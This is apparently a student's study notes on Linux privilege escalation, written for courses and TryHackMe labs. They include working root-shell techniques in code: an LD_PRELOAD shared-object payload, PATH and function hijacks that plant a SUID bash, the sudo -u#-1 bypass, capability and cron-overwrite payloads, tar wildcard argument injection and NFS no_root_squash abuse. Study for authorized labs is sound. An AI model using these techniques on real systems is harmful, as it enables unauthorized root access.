Tags:  #privilege-escalation , #linux 
Index: [[]] - index location 

#### Courses
Linux priv esc TCM

#### Some resources
[https://github.com/Gr1mmie/Linux-Privilege-Escalation-Resources](https://github.com/Gr1mmie/Linux-Privilege-Escalation-Resources)

Basic Linux Privilege Escalation - [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

Linux Privilege Escalation - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

Checklist - Linux Privilege Escalation - [https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)

Sushant 747's Guide (Country dependant - may need VPN) - [https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)

#### LAB
Linux PrivEsc Lab - [https://tryhackme.com/room/linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)

---
## Kernel Exploitation


Kernel Exploits https://github.com/lucyoa/kernel-exploits

Search in google for version then use exploit to escalate

---
## Passwords and File Permissions

`history` command or `.bash_history` file may reveal passwords

search for keywords like passwd or password etc can reveal password

Can find password in openvpn files

---

## SUDO Shell escaping

`sudo -l` - things we can execute as root with no password(NO PASSWD)

[GTFO Bins](https://gtfobins.github.io/) is a good recourse to find binaries in Linux systems for priv esc

Binaries has some features that can be abused to get root shell

---

## SUDO Abusing intended functionality

Search for binary, sudo priv esc - for binaries not in gtfo

try - Sunday machine - HTB

---

## SUDO LD_Preload

`sudo -l`

we can see env_keep+=LD_PRELOAD

It can be used to preload libraries

Lets write a `shell.c`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```
`
This code will preload the shell.c and give us 
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

Use LD_Preload to preload our malicious library
`sudo LD_PRELOAD=/path/to/shell.so  any-binary-with-sudo-permission`

---

## SUDO Priv Esc Exploit

#### CVE-2019-14827

```sh
# Sudo <1.8.28
# CVE-2019-14827
sudo -u#-1 /bin/bash
```

Refer: https://tryhackme.com/room/sudovulnsbypass

---

#### CVE-2019-18634

Refer: https://tryhackme.com/room/sudovulnsbof

---

#### CVE-2021-3156

Refer: https://tryhackme.com/room/sudovulnssamedit

---
## SUID

Refer: https://tryhackme.com/room/vulnversity

`find / perm -u=s -type file 2> /dev/null`
 - used to find files with setuid
---
#### Shared object injection (Similar to DLL hijacking in windows)

`find / -type f -perm -04000 -ls 2> /dev/null`

reserach in gtfo bins first

Then try shared object injection

S trace - diagnostic tool 

`strace binary path 2 >&1`  - gives all trace of app
`strace binary path 2 >&1 | grep -i -E "open|access|no such file" ` - greps the trace to display opening and accessing objects and error messages

Check for the objects that come up and check if we have write access to that folder

We can create the missing file with malicious code

---
#### Binary Simlinks (CVE-2016-1247) - ⚠️ Read Writeup

https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html

Uses a vuln with NGINX and SUID 

Automatic discovery
 - Run linux exploit suggestor - Look for nginxed-root.sh

Manual Discovery
-  dpkg -l | grep nginx - to find installed nginx version
-  Check if version is vulnerable ( anything < 1.6.2 is vulnerable)
-  use `find / -type f -perm -04000 -ls 2> /dev/null` to find SUID enabled binaries,
- Check for `sudo` with the SUID permission - we need this to work
-  `ls -la var/log/nginx` - we can see root has read write execute permissions
-  We are replacing the symlink to log file with a malicious link so it will run during restart giving root
-  use nginxed-root.sh and point to log file for it to do that 
---
#### Environmental Variables

`env` - displays all environment variable

 Use `find / -type f -perm -04000 -ls 2> /dev/null` to find SUID enabled binaries,

run `strings` on the target binary - `strings binary_name`

##### Case 1

>If you find that it calls an installed service ( say service to start apache ) - (`service apache2 start`)
  We can change the `$PATH` variable to add a folder containing malicious path

- Compile a malicious code into a binary and call it service(in this case)

```c /tmp/service
int main()
{
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}
```

- Let us say it is in `tmp` let us add it to path first.
```sh
export PATH=/tmp:$PATH
```

- Now if we run the binary we can access root.

##### Case 2

>What if it calls an installed service using its full path (`/usr/sbin/service apache2 start`)
>Above method wont work! Try this below

- Create a shell function /usr/sbin/service

```sh
function /usr/sbin/service() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;}
```

- Save the shell function as below

```sh
export -f /usr/sbin/service
```

- Run the affected binary

---
#### Exploiting Linux Capabilities

⚠️Refer article series - https://tbhaxor.com/understanding-linux-capabilities/
Linux Privilege Escalation using Capabilities - [https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

SUID vs Capabilities - [https://mn3m.info/posts/suid-vs-capabilities/](https://mn3m.info/posts/suid-vs-capabilities/)

Linux Capabilities Privilege Escalation - [https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

More secure than SUIDs

`getcap -r / 2> /dev/null` - Get Capabilities

say python2.6 has `cap_setuid+ep` Capability. ep permits everything

we can leverage the issue to elevate as root

run `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

We get a root shell

tar, openssl, pearl etc stand out


---
## Scheduled Tasks

`cat /etc/crontab` - displays table cronjobs

⚠️ Read Payload all the things linux priv esc checklist

#### Escalation via Cron paths

- See the PATH variable and see the paths.
- Inspect the first path to find if they have all the files listed in cron table
- If not, we can create the file (if we have permissions) and replace it with something like the one below.
```sh
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/usr/overwrite.sh
```

Also do `chmod +x overwrite.sh`

Here the path is `/home/usr` and missing file in crontab is `overwrite.sh`

---
#### Escalation via Cron wildcards

This can be used in multiple cases

>Scenario : On inspecting the crontab. We have a file which is scheduled to run as root with the following content:

```sh
#!/bin/bash
cd /home/user
tar czf /tmp/backup.tar.gz *
```

*What can we do:*

We can trick tar to run commands as it retrieves the files as *

If we have write permission in the /home/user directory

Let us create a file `runme.sh` 

```sh
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
```

We can trick tar to run `--checkpoint=1` and `--checkpoint-action=exec=sh\runme.sh` simply by using `touch --checkpoint=1` and `touch --checkpoint-action=exec=sh\runme.sh` in /home/user directory

This will cause tar to consider them as arguments and execute commands for us

❤️ Can be used in multiple places

---
#### Escalation via Cron overwrite (Most Common)

If Files listed in cron jobs can be modified by our user

The change the code to our favour something like this:
```sh
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```

This will run the code as root and we can get root shell.

---
==Do CMesS box in THM==

---
#### NFS Root Squashing

cat /etc/exports

If we see a folder with no_root_squash , we can mount that file remotely to attacker system and make files and set permissions as root user

Say `/tmp` folder has `no_root_squash`

From our attacker machine we can mount temp 
- Let us make a directory called say `/tmp/mountme` in our attacker machine 
- Lets mount the file /tmp to `mountme` directory - `mount - rw,vers=2 victim-ip-addr:/tmp /tmp/mountme`
- We can create our malicious C code, compile it to an executable and add suid bit to it with chmod+s
- All these will be performed as root user in the victim machine and we can get root shell if we execute this in victim machine
---
## Docker

==Do UltraTech box in THM==

---
#### Challenge(THM)

==Lazy Admin
Anonymous
Tomghost
ConvertMyVideo (pspy)
Brainpan1 (BoF)  - use windows Immunity debugger - or gdb in linux==

---

